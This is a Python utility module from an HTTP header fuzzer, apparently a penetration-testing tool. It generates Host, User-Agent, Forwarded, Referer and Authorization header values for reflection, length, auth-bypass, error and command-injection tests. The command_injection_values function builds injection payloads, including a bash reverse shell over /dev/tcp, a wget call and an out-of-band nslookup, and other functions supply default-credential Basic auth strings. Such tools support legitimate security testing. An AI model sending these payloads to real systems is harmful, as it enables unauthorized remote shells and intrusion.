""" This (very bloated) file contains utils that I felt didn't fit well inside header_fuzzer.py """
import string
import random
from HttpHeaderFuzzer.config import *


def normalize_urls(urls):
    """ Accepts a list of urls and formats them so they will be accepted.
    Returns a new list of the processed urls """
    url_list = []
    http_port_list = ['80', '280', '81', '591', '593', '2080', '2480', '3080', '4080', '4567', '5080', '5104',
                      '5800',
                      '6080', '7001', '7080', '7777', '8000', '8008', '8042', '8080', '8081', '8082', '8088',
                      '8180',
                      '8222', '8280', '8281', '8530', '8887', '9000', '9080', '9090', '16080']
    https_port_list = ['832', '981', '1311', '7002', '7021', '7023', '7025', '7777', '8333', '8531', '8888']
    for url in urls:
        if '*.' in url:
            url.replace('*.', '')
        if not url.startswith('http'):
            if ':' in url:
                port = url.split(':')[-1]
                if port in http_port_list:
                    url_list.append('http://' + url)
                elif port in https_port_list or port.endswith('43'):
                    url_list.append('https://' + url)
                else:
                    url = url.strip()
                    url = url.strip('/') + '/'
                    url_list.append('http://' + url)
                    url_list.append('https://' + url)
                    continue
            else:
                url = url.strip()
                url = url.strip('/') + '/'
                url_list.append('http://' + url)
                url_list.append('https://' + url)
                continue
        url = url.strip()
        url = url.strip('/') + '/'
        url_list.append(url)

    return url_list


def get_header_values(test, header):
    """ Accepts the name of an HTTP header and returns the contents of a
    function containing a list of header values associated with the header
    name """
    if header == 'User-Agent':
        return get_useragent_header_values(test)
    if header == 'Host':
        return get_host_header_values(test)
    if header == 'Forwarded':
        return get_forwarded_header_values(test)
    if header == 'X-Forwarded-For':
        return get_forwarded_header_values(test)
    if header == 'From':
        return get_host_header_values(test)
    if header == 'Referer':
        return get_referer_header_values(test)
    if header == 'Connection':
        return get_connection_header_values(test)
    if header == 'Authorization':
        return get_authorization_header_values(test)


def get_random_useragent():
    """ Returns a randomly chosen User-Agent string """
    win_edge = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ' \
               '(KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246'
    win_firefox = 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/43.0'
    win_chrome = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) " \
                 "Chrome/63.0.3239.84 Safari/537.36"
    lin_firefox = 'Mozilla/5.0 (X11; Linux i686; rv:30.0) Gecko/20100101 Firefox/42.0'
    mac_chrome = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) ' \
                 'Chrome/40.0.2214.38 Safari/537.36'
    ie = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)'

    ua_dict = {
        1: win_edge,
        2: win_firefox,
        3: win_chrome,
        4: lin_firefox,
        5: mac_chrome,
        6: ie
    }
    rand_num = random.randrange(1, (len(ua_dict) + 1))

    return ua_dict[rand_num]


def get_random_string(length):
    """ Returns a random string consisting of lowercase letters """
    letters = string.ascii_lowercase

    return ''.join(random.choice(letters) for i in range(length))


def get_host_header_values(test):
    """ Returns host header values """
    values = []
    if test == 'reflection':
        random_string = get_random_string(10)
        values.append(random_string)
    if test == 'length':
        for i in range(0, 500, 50):
            random_string = get_random_string(i)
            values.append(random_string)
    if test == 'authorization':
        addresses = ['127.0.0.1', 'localhost', '10.10.1.1']
        values += [addr for addr in addresses]
    if test == 'error':
        items = ['\'', '"', ';', '#', '\\', '}', '{', '<>', '<', '>']
        values += [item for item in items]
    if test == 'command injection':
        items = command_injection_values()
        values += [item for item in items]

    return values


def get_useragent_header_values(test):
    """ Returns header values """
    values = []
    if test == 'reflection':
        random_string = get_random_string(40)
        values.append(random_string)
    if test == 'length':
        for i in range(50, 500, 50):
            random_string = get_random_string(i)
            values.append(random_string)
    if test == 'authorization':
        mobile_user_agents = ['Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) '
                              'AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1',
                              'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) '
                              'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36']
        values += [ua for ua in mobile_user_agents]
    if test == 'command injection':
        items = command_injection_values()
        values += [item for item in items]

    return values


def get_forwarded_header_values(test):
    """ Returns header values """
    values = []
    if test == 'reflection':
        random_string = get_random_string(10)
        values.append('for=' + random_string)
    if test == 'length':
        for i in range(50, 500, 50):
            random_string = get_random_string(i)
            values.append(random_string)
    if test == 'authorization':
        addresses = ['127.0.0.1', 'localhost', '10.10.1.1']
        values += ['for=' + addr for addr in addresses]
    if test == 'error':
        items = ['\'', '"', ';', '#', '\\', '}', '{', '<>', '<', '>']
        values += [item for item in items]

    return values


def get_connection_header_values(test):
    """ Returns header values """
    values = []
    if test == 'reflection':
        random_string = get_random_string(10)
        values.append(random_string)
    if test == 'length':
        for i in range(50, 500, 50):
            string_val = 'A' * i
            values.append(string_val)
    if test == 'command injection':
        items = command_injection_values()
        values += [item for item in items]

    return values


def get_referer_header_values(test):
    """ Returns header values """
    values = []
    if test == 'reflection':
        random_string = get_random_string(10)
        values.append(random_string)
    if test == 'length':
        for i in range(50, 500, 50):
            random_string = get_random_string(i)
            values.append(random_string)
    if test == 'authorization':
        addresses = ['', '127.0.0.1', 'localhost', '10.10.1.1']
        values += [addr for addr in addresses]
    if test == 'command injection':
        items = command_injection_values()
        values += [item for item in items]

    return values


def get_authorization_header_values(test):
    """ Returns header values """
    values = []
    if test == 'reflection':
        random_string = get_random_string(10)
        values.append(random_string)
    if test == 'length':
        for i in range(50, 500, 50):
            random_string = get_random_string(i)
            values.append(random_string)
    if test == 'authorization':
        auths = ['Basic YWRtaW46YWRtaW4=', 'Basic Z3Vlc3Q6Z3Vlc3Q=', 'Digest AAAA', 'Bearer AAAA']
        values += [auth for auth in auths]
    if test == 'error':
        items = ['\'', '"', ';', '#', '\\', '}', '{', '<>', '<', '>', '../../', '..\\..\\']
        values += [item for item in items]
    if test == 'command injection':
        items = command_injection_values()
        values += [item for item in items]

    return values


def command_injection_values():
    """ Returns values dealing with command injection """
    ip = IP_ADDRESS if IP_ADDRESS else '127.0.0.1'
    port = PORT if PORT else '80'
    domain = DOMAIN_NAME if DOMAIN_NAME else 'laconicwolf.com'
    random_string = get_random_string(8)
    values = [';ping ' + ip + ' -c 6',
              ';/bin/bash -i > /dev/tcp/' + ip + '/' + port + '0<&1 2>&1',
              ';nslookup ' + random_string + '.' + domain,
              ';wget http://' + ip]

    return values


def get_headers_to_fuzz(args):
    """ Grab the headers to fuzz via the args """
    headers_to_fuzz = []
    if args.all_headers or args.host_header:
        headers_to_fuzz.append('Host')
    if args.all_headers or args.user_agent_header:
        headers_to_fuzz.append('User-Agent')
    if args.all_headers or args.forwarded_header:
        headers_to_fuzz.append('Forwarded')
    if args.all_headers or args.x_forwarded_for_header:
        headers_to_fuzz.append('X-Forwarded-For')
    if args.all_headers or args.from_header:
        headers_to_fuzz.append('From')
    if args.all_headers or args.referer_header:
        headers_to_fuzz.append('Referer')
    if args.all_headers or args.connection_header:
        headers_to_fuzz.append('Connection')
    if args.all_headers or args.authorization_header:
        headers_to_fuzz.append('Authorization')

    return headers_to_fuzz


def get_tests_to_run(args):
    """ Grab the tests to run via the args """
    tests_to_run = []
    if args.all_tests or args.reflection_test:
        tests_to_run.append('reflection')
    if args.all_tests or args.length_test:
        tests_to_run.append('length')
    if args.all_tests or args.authorization_test:
        tests_to_run.append('authorization')
    if args.all_tests or args.error_tests:
        tests_to_run.append('error')
    if args.all_tests or args.command_injection_tests:
        tests_to_run.append('command injection')

    return tests_to_run
